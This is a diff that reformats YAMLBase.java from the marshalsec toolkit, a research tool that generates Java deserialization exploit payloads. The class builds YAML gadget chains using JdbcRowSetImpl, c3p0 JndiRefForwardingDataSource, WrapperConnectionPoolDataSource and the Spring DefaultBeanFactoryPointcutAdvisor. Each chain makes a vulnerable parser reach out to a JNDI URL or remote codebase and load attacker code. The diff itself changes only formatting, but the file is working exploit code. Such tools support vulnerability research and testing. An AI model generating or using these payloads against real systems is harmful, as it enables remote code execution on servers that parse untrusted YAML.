@@ -23,93 +23,89 @@ SOFTWARE.
 package marshalsec;
 
 
+import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
+import com.sun.rowset.JdbcRowSetImpl;
+import marshalsec.gadgets.Args;
+import marshalsec.gadgets.C3P0WrapperConnPool;
+import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
+import org.springframework.jndi.support.SimpleJndiBeanFactory;
+
 import java.util.Collections;
 import java.util.LinkedHashMap;
 import java.util.Map;
 import java.util.Map.Entry;
 
-import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
-import org.springframework.jndi.support.SimpleJndiBeanFactory;
-
-import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
-import com.sun.rowset.JdbcRowSetImpl;
-
-import marshalsec.gadgets.Args;
-import marshalsec.gadgets.C3P0WrapperConnPool;
-
 
 /**
  * @author mbechler
- *
  */
 public abstract class YAMLBase extends MarshallerBase<String> {
 
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makeJdbcRowSet ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makeJdbcRowSet(UtilFactory uf, String[] args) throws Exception {
         Map<String, String> properties = new LinkedHashMap<>();
-        properties.put("dataSourceName", writeString(args[ 0 ]));
+        properties.put("dataSourceName", writeString(args[0]));
         properties.put("autoCommit", "true");
         return writeObject(JdbcRowSetImpl.class, properties);
     }
 
 
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makeRefDataSource ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makeRefDataSource(UtilFactory uf, String[] args) throws Exception {
         Map<String, String> props = new LinkedHashMap<>();
-        props.put("jndiName", writeString(args[ 0 ]));
+        props.put("jndiName", writeString(args[0]));
         props.put("loginTimeout", "0");
         return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
     }
 
 
-    @Args ( minArgs = 2, args = {
-        "codebase", "class"
+    @Args(minArgs = 2, args = {
+            "codebase", "class"
     }, defaultArgs = {
-        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
-    } )
-    public Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    })
+    public Object makeWrapperConnPool(UtilFactory uf, String[] args) throws Exception {
         return writeObject(
-            WrapperConnectionPoolDataSource.class,
-            Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]))));
+                WrapperConnectionPoolDataSource.class,
+                Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
     }
 
 
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makeBeanFactoryPointcutAdvisor(UtilFactory uf, String[] args) throws Exception {
         Map<String, String> properties = new LinkedHashMap<>();
-        String jndiUrl = args[ 0 ];
+        String jndiUrl = args[0];
         properties.put("adviceBeanName", writeString(jndiUrl));
         properties.put(
-            "beanFactory",
-            writeObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(writeString(jndiUrl))), 2));
+                "beanFactory",
+                writeObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(writeString(jndiUrl))), 2));
         return writeSet(
-            writeObject(DefaultBeanFactoryPointcutAdvisor.class, properties, 1),
-            writeConstructor(DefaultBeanFactoryPointcutAdvisor.class, true));
+                writeObject(DefaultBeanFactoryPointcutAdvisor.class, properties, 1),
+                writeConstructor(DefaultBeanFactoryPointcutAdvisor.class, true));
     }
 
 
-    protected String writeArray ( String... elems ) {
+    protected String writeArray(String... elems) {
         StringBuilder sb = new StringBuilder();
         sb.append('[');
         boolean first = true;
-        for ( String elem : elems ) {
-            if ( !first ) {
+        for (String elem : elems) {
+            if (!first) {
                 sb.append(',');
                 sb.append(' ');
-            }
-            else {
+            } else {
                 first = false;
             }
             sb.append(elem);
@@ -119,30 +115,30 @@ public abstract class YAMLBase extends MarshallerBase<String> {
     }
 
 
-    protected String writeObject ( Class<?> clazz, Map<String, String> properties, String... consArgs ) {
+    protected String writeObject(Class<?> clazz, Map<String, String> properties, String... consArgs) {
         return writeObject(clazz.getName(), properties, consArgs);
     }
 
 
-    protected String writeObject ( String clazz, Map<String, String> properties, String... consArgs ) {
+    protected String writeObject(String clazz, Map<String, String> properties, String... consArgs) {
         return writeObject(clazz, properties, 0, consArgs);
     }
 
 
-    protected String writeObject ( Class<?> clazz, Map<String, String> properties, int level, String... consArgs ) {
+    protected String writeObject(Class<?> clazz, Map<String, String> properties, int level, String... consArgs) {
         return writeObject(clazz.getName(), properties, level, consArgs);
     }
 
 
-    protected String writeObject ( String clazz, Map<String, String> properties, int level, String... consArgs ) {
+    protected String writeObject(String clazz, Map<String, String> properties, int level, String... consArgs) {
         StringBuilder sb = new StringBuilder();
         sb.append(writeConstructor(clazz, false, consArgs));
 
-        if ( !properties.isEmpty() ) {
-            int indent = ( level + 1 ) * 2;
-            for ( Entry<String, String> prop : properties.entrySet() ) {
+        if (!properties.isEmpty()) {
+            int indent = (level + 1) * 2;
+            for (Entry<String, String> prop : properties.entrySet()) {
                 sb.append('\n');
-                for ( int i = 0; i < indent; i++ ) {
+                for (int i = 0; i < indent; i++) {
                     sb.append(' ');
                 }
                 sb.append(prop.getKey());
@@ -154,14 +150,13 @@ public abstract class YAMLBase extends MarshallerBase<String> {
     }
 
 
-    protected String writeSet ( String... elements ) {
+    protected String writeSet(String... elements) {
         StringBuilder sb = new StringBuilder();
         sb.append("set:");
-        if ( elements.length == 0 ) {
+        if (elements.length == 0) {
             sb.append('\n');
-        }
-        else {
-            for ( String elem : elements ) {
+        } else {
+            for (String elem : elements) {
                 sb.append('\n');
                 sb.append("  ? ");
                 sb.append(elem);
@@ -171,16 +166,16 @@ public abstract class YAMLBase extends MarshallerBase<String> {
     }
 
 
-    protected String writeConstructor ( Class<?> clazz, boolean inline, String... args ) {
+    protected String writeConstructor(Class<?> clazz, boolean inline, String... args) {
         return writeConstructor(clazz.getName(), inline, args);
     }
 
 
-    protected String writeConstructor ( String clazz, boolean inline, String... args ) {
+    protected String writeConstructor(String clazz, boolean inline, String... args) {
         StringBuilder sb = new StringBuilder();
         sb.append(constructorPrefix(inline));
         sb.append(clazz);
-        if ( constructorArgumentsSupported() && ( inline || args.length != 0 ) ) {
+        if (constructorArgumentsSupported() && (inline || args.length != 0)) {
             sb.append(' ');
             sb.append(writeArray(args));
         }
@@ -188,13 +183,13 @@ public abstract class YAMLBase extends MarshallerBase<String> {
     }
 
 
-    protected abstract String constructorPrefix ( boolean inline );
+    protected abstract String constructorPrefix(boolean inline);
 
 
-    protected abstract boolean constructorArgumentsSupported ();
+    protected abstract boolean constructorArgumentsSupported();
 
 
-    protected String writeString ( String string ) {
+    protected String writeString(String string) {
         return '"' + string + '"';
     }
 
